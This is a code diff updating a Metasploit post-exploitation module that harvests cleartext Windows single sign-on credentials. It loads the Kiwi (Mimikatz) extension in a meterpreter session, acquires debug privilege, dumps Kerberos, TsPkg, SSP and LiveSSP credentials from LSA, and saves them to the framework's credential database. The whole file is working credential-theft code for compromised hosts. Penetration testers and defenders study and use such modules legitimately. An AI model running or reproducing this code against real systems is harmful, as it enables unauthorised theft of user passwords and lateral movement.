@@ -1,29 +1,37 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/post/windows/priv'
+require 'set'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
-      'Description'  => %q{
-        This module will collect cleartext Single Sign On credentials from the Local
-      Security Authority using the Mimikatz extension. Blank passwords will not be stored
-      in the database.
-          },
-      'License'      => MSF_LICENSE,
-      'Author'       => ['Ben Campbell'],
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Single Sign On Credential Collector (Mimikatz)',
+        'Description' => %q{
+          This module will collect cleartext Single Sign On credentials from the Local
+          Security Authority using the Kiwi (Mimikatz) extension. Blank passwords will not be stored
+          in the database.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Ben Campbell'],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              kiwi_exec_cmd
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
@@ -34,15 +42,15 @@ class Metasploit3 < Msf::Post
 
     print_status("Running module against #{sysinfo['Computer']}")
 
-    if (client.platform =~ /x86/) and (client.sys.config.sysinfo['Architecture'] =~ /x64/)
-      print_error("x64 platform requires x64 meterpreter and mimikatz extension")
+    if session.arch == ARCH_X86 and sysinfo['Architecture'] == ARCH_X64
+      print_error("x64 platform requires x64 meterpreter and kiwi extension")
       return
     end
 
-    unless client.mimikatz
-      vprint_status("Loading mimikatz extension...")
+    unless client.kiwi
+      vprint_status("Loading kiwi extension...")
       begin
-        client.core.use("mimikatz")
+        client.core.use("kiwi")
       rescue Errno::ENOENT
         print_error("This module is only available in a windows meterpreter session.")
         return
@@ -51,50 +59,45 @@ class Metasploit3 < Msf::Post
 
     unless is_system?
       vprint_warning("Not running as SYSTEM")
-      debug = client.mimikatz.send_custom_command("privilege::debug")
-      if debug =~ /Not all privileges or groups referenced are assigned to the caller/
+      unless client.kiwi.get_debug_privilege
         print_error("Unable to get Debug privilege")
         return
-      else
-        vprint_status("Retrieved Debug privilege")
       end
+      vprint_status("Retrieved Debug privilege")
     end
 
-    vprint_status("Retrieving WDigest")
-    res = client.mimikatz.wdigest
-    vprint_status("Retrieving Tspkg")
-    res.concat client.mimikatz.tspkg
-    vprint_status("Retrieving Kerberos")
-    res.concat client.mimikatz.kerberos
-    vprint_status("Retrieving SSP")
-    res.concat client.mimikatz.ssp
-    vprint_status("Retrieving LiveSSP")
-    livessp = client.mimikatz.livessp
-    unless livessp.first[:password] =~ /livessp KO/
-      res.concat client.mimikatz.livessp
-    else
-      vprint_error("LiveSSP credentials not present")
-    end
+    vprint_status("Retrieving Credentials")
+    res = client.kiwi.creds_all
 
-    table = Rex::Ui::Text::Table.new(
+    table = Rex::Text::Table.new(
       'Header' => "Windows SSO Credentials",
       'Indent' => 0,
       'SortIndex' => 0,
-      'Columns' =>
-      [
-        'AuthID', 'Package', 'Domain', 'User', 'Password'
-      ]
+      'Columns' => ['Package', 'Domain', 'User', 'Password']
     )
 
-    unique_results = res.index_by { |r| "#{r[:authid]}#{r[:user]}#{r[:password]}" }.values
+    processed = Set.new
+    livessp_found = false
+    [:tspkg, :kerberos, :ssp, :livessp].each do |package|
+      next unless res[package]
 
-    unique_results.each do |result|
-      next if is_system_user? result[:user]
-      table << [result[:authid], result[:package], result[:domain], result[:user], result[:password]]
-      report_creds(result[:domain], result[:user], result[:password])
+      res[package].each do |r|
+        next if is_system_user?(r['Username'])
+        next if r['Username'] == '(null)' && r['Password'] == '(null)'
+
+        row = [r['Domain'], r['Username'], r['Password']]
+        id = row.join(":")
+        unless processed.include?(id)
+          table << [package.to_s] + row
+          report_creds(*row)
+          processed << id
+        end
+        livessp_found = true if package == :livessp
+      end
     end
 
-    print_line table.to_s
+    print_line(table.to_s)
+    print_error("No LiveSSP credentials found.\n") unless livessp_found
   end
 
   def report_creds(domain, user, pass)
@@ -113,7 +116,7 @@ class Metasploit3 < Msf::Post
     }
 
     unless domain.blank?
-      credential_data[:realm_key]   = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
       credential_data[:realm_value] = domain
     end
 
@@ -133,7 +136,6 @@ class Metasploit3 < Msf::Post
     create_credential_login(login_data)
   end
 
-
   def is_system_user?(user)
     system_users = [
       /^$/,
@@ -150,8 +152,6 @@ class Metasploit3 < Msf::Post
       /^LOCAL SYSTEM$/
     ]
 
-    system_users.find{|r| user.to_s.match(r)}
+    system_users.find { |r| user.to_s.match(r) }
   end
-
 end
-
